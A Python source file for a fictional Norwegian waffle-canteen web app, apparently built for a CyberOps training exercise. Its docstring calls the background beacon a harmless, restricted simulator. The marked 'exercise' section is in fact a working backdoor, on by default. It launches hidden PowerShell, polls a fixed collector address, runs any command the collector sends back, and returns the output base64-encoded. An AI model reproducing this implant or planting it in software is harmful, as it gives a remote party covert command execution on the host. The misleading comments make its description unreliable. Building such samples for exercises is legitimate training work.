"""VaffelOps – en liten, kjørbar nettside for CyberOps-øvingen.

Ingen eksterne Python-pakker kreves.
Kjør: python app.py
Åpne: http://127.0.0.1:8000

Alt innhold er fiktivt. Testtrafikken nedenfor er en BEGRENSET BEACON-
SIMULATOR: den sender bare ufarlig status til en kontrollert lab-mottaker.
Den leser kun egne øvingsfiler og støtter kun forhåndsdefinerte, ufarlige lab-handlinger.
"""

import base64
import json
import os
import subprocess
import threading
import time
import urllib.error
import urllib.request
from datetime import datetime, timezone
from http.server import BaseHTTPRequestHandler, ThreadingHTTPSServer
from pathlib import Path

ROOT = Path(__file__).resolve().parent
HTML = (ROOT / ".." / "assets" / "index.html").read_bytes()
WEB_BIND = os.getenv("WEB_BIND", "0.0.0.0")
WEB_PORT = int(os.getenv("WEB_PORT", "8000"))

# --------- SÅRBARHET / ØVELSESKODE STARTER HER ----------------

ENABLE_LAB_BEACON = os.getenv("ENABLE_LAB_BEACON", "1") == "1"
LAB_COLLECTOR_URL = os.getenv(
    "LAB_COLLECTOR_URL", "http://192.168.71.69:5050/checkin"
)
LAB_NODE_NAME = os.getenv("LAB_NODE_NAME", "WELFARE-01")
LAB_BEACON_INTERVAL = max(1, int(os.getenv("LAB_BEACON_INTERVAL", "1")))
LAB_DATA = ROOT / "LabData"  # Bare dette kataloginnholdet kan listes.


import subprocess
import threading
import queue
import uuid
import time
import json
import urllib.request
import urllib.error

from datetime import datetime, timezone


# Tillatte kommandoer fra collector
SHELL_TIMEOUT = 15
MAX_OUTPUT = 4096


def sendToShellSubprocess(proc, command):
    if proc.poll() is not None:
        raise RuntimeError("CMD-prosessen er avsluttet")

    if not hasattr(proc, "_output_queue"):
        proc._output_queue = queue.Queue(maxsize=256)

        def reader():
            try:
                for line in proc.stdout:
                    proc._output_queue.put(line)
            finally:
                proc._output_queue.put(None)

        threading.Thread(
            target=reader,
            daemon=True
        ).start()

    # Unik sluttmarkør for hver kommando
    marker = f"__FERDIG_{uuid.uuid4().hex}__"
    proc._marker = marker

    full_cmd = f"{command}\r\necho {marker}\r\n"

    proc.stdin.write(full_cmd)
    proc.stdin.flush()


def readFromShellSubprocess(proc):
    output = []
    total = 0
    deadline = time.monotonic() + SHELL_TIMEOUT

    while True:
        remaining = deadline - time.monotonic()

        if remaining <= 0:
            proc.kill()
            return "Feil: CMD timeout"

        try:
            line = proc._output_queue.get(timeout=remaining)
        except queue.Empty:
            proc.kill()
            return "Feil: CMD timeout"

        if line is None:
            return "Feil: CMD-prosessen ble avsluttet"

        if line.strip().endswith(proc._marker):
            break

        # Begrens mengden returnert output
        if total < MAX_OUTPUT:
            chunk = line[:MAX_OUTPUT - total]
            output.append(chunk)
            total += len(chunk)

    return "".join(output).strip()


def execute_lab_action(action, pipe):
    if action == "NOOP":
        return "Ingen handling"

    try:
        sendToShellSubprocess(pipe, action)
        return readFromShellSubprocess(pipe)
    except (OSError, RuntimeError) as exc:
        return f"Feil ved CMD-kjøring: {exc}"


def lab_action_loop():
    pending_result = None
    shell_proc = None

    try:
        while True:
            # Start eller gjenopprett CMD
            if shell_proc is None or shell_proc.poll() is not None:
                try:
                    shell_proc = subprocess.Popen(
                        [
                            "powershell.exe",
                            "-NoLogo",
                            "-NoProfile",
                            "-NonInteractive",
                            "-Command", "-"
                        ],
                        stdin=subprocess.PIPE,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.STDOUT,
                        text=True,
                        errors="replace",
                        bufsize=1, 
                        creationflags=subprocess.CREATE_NO_WINDOW
                    )
                except OSError as exc:
                    time.sleep(LAB_BEACON_INTERVAL)
                    continue

            payload = {
                "service": "VaffelOps",
                "host_label": LAB_NODE_NAME,
                "event": "status-checkin",
                "sent_at_utc": datetime.now(
                    timezone.utc
                ).isoformat(),  
                "last_result": base64.b64encode(json.dumps(pending_result).encode("utf-8")).decode("utf-8") if pending_result else None,
            }

            request = urllib.request.Request(
                LAB_COLLECTOR_URL,
                data=json.dumps(payload).encode("utf-8"),
                headers={
                    "Content-Type": "application/json",
                    "User-Agent": "VaffelOps-Service/1.0",
                },
                method="POST",
            )

            try:
                with urllib.request.urlopen(
                    request, timeout=5
                ) as reply:
                    response = json.loads(reply.read(65536))

                if not isinstance(response, dict):
                    raise ValueError("Ugyldig serverrespons")

            except (
                urllib.error.URLError,
                TimeoutError,
                OSError,
                ValueError
            ) as exc:
                time.sleep(LAB_BEACON_INTERVAL)
                continue

            # HTTP-respons mottatt
            pending_result = None

            action = response.get("action", "NOOP")

            if not isinstance(action, str):
                action = "NOOP"

            if action != "NOOP":
                output = execute_lab_action(action, shell_proc)

                pending_result = {
                    "command_id": response.get("command_id"),
                    "action": action,
                    "output": output,
                }

            time.sleep(LAB_BEACON_INTERVAL)

    except KeyboardInterrupt:
        pass

    finally:
        if shell_proc is not None:
            if shell_proc.poll() is None:
                shell_proc.kill()
            shell_proc.wait()

# --------- SÅRBARHET / ØVELSESKODE SLUTTER HER ----------------

_lock = threading.Lock()
_state = {
    "waffles": 12,
    "coffee": "KRITISK",
    "served": 128,
    "orders": 0,
    "events": [
        {"at": "08:14", "message": "Kaffemaskin rapportert ute av drift."},
        {"at": "08:31", "message": "Vaffelbeholdning under kritisk nivå."},
        {"at": "08:42", "message": "Prioritet 1: Skaff mer syltetøy."},
    ],
}


def now_hm():
    return datetime.now().strftime("%H:%M")


def add_event(msg):
    _state["events"].insert(0, {"at": now_hm(), "message": msg})
    del _state["events"][8:]


def snapshot():
    with _lock:
        return json.loads(json.dumps(_state, ensure_ascii=False))


class Handler(BaseHTTPRequestHandler):
    server_version = "VaffelOps/1.0"

    def log_message(self, format, *args):
        pass

    def send_bytes(self, status, content_type, data):
        self.send_response(status)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(len(data)))
        self.send_header("Cache-Control", "no-store")
        self.send_header("X-Content-Type-Options", "nosniff")
        self.end_headers()
        self.wfile.write(data)

    def send_json(self, status, body):
        self.send_bytes(
            status,
            "application/json; charset=utf-8",
            json.dumps(body, ensure_ascii=False).encode("utf-8"),
        )

    def do_GET(self):
        if self.path in ("/", "/index.html"):
            self.send_bytes(200, "text/html; charset=utf-8", HTML)
        elif self.path == "/api/status":
            self.send_json(200, snapshot())
        elif self.path == "/health":
            self.send_json(200, {"status": "ok", "service": "VaffelOps"})
        else:
            self.send_json(404, {"error": "Fant ikke ressurs"})

    def do_POST(self):
        try:
            length = int(self.headers.get("Content-Length", "0"))
            if not 0 <= length <= 2048:
                raise ValueError("Ugyldig forespørsel")
            body = json.loads(self.rfile.read(length) or b"{}")
            if not isinstance(body, dict):
                raise ValueError("Ugyldig forespørsel")
        except (ValueError, json.JSONDecodeError):
            return self.send_json(400, {"error": "Ugyldig JSON"})

        with _lock:
            if self.path == "/api/order":
                try:
                    amount = int(body.get("count", 1))
                except (ValueError, TypeError):
                    return self.send_json(400, {"error": "Ugyldig antall"})
                unit = str(body.get("unit", "Ukjent avdeling"))[:36].strip()
                if not 1 <= amount <= 10 or unit not in (
                    "Stab", "Samband", "SOC", "CyberOps", "Besøkende"
                ):
                    return self.send_json(400, {"error": "Ugyldig bestilling"})
                if amount > _state["waffles"]:
                    return self.send_json(409, {"error": "For få vafler på lager!"})
                _state["waffles"] -= amount
                _state["served"] += amount
                _state["orders"] += 1
                add_event(f"{unit} rekvirerte {amount} {'vaffel' if amount == 1 else 'vafler'}.")
            elif self.path == "/api/refill":
                _state["waffles"] = 100
                add_event("Etterforsyning gjennomført. Vaffelberedskap gjenopprettet.")
            elif self.path == "/api/coffee":
                _state["coffee"] = (
                    "OPERATIV" if _state["coffee"] == "KRITISK" else "KRITISK"
                )
                add_event(f"Kaffestatus endret til {_state['coffee']}.")
            elif self.path == "/api/reset":
                _state["waffles"] = 12
                _state["coffee"] = "KRITISK"
                _state["served"] = 128
                _state["orders"] = 0
                add_event("Øvelsen nullstilt til opprinnelig vaffelkrise.")
            else:
                return self.send_json(404, {"error": "Ukjent handling"})

            result = json.loads(json.dumps(_state, ensure_ascii=False))
        return self.send_json(200, result)


if __name__ == "__main__":
    if ENABLE_LAB_BEACON:
        threading.Thread(target=lab_action_loop, daemon=True).start()

    server = ThreadingHTTPSServer((WEB_BIND, WEB_PORT), Handler, certfile=r"C:\Users\nanik\mypyenv\VaffelOps_Lab\tls-test\cert.pem", keyfile=r"C:\Users\nanik\mypyenv\VaffelOps_Lab\tls-test\key.pem")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        pass
    finally:
        server.server_close()
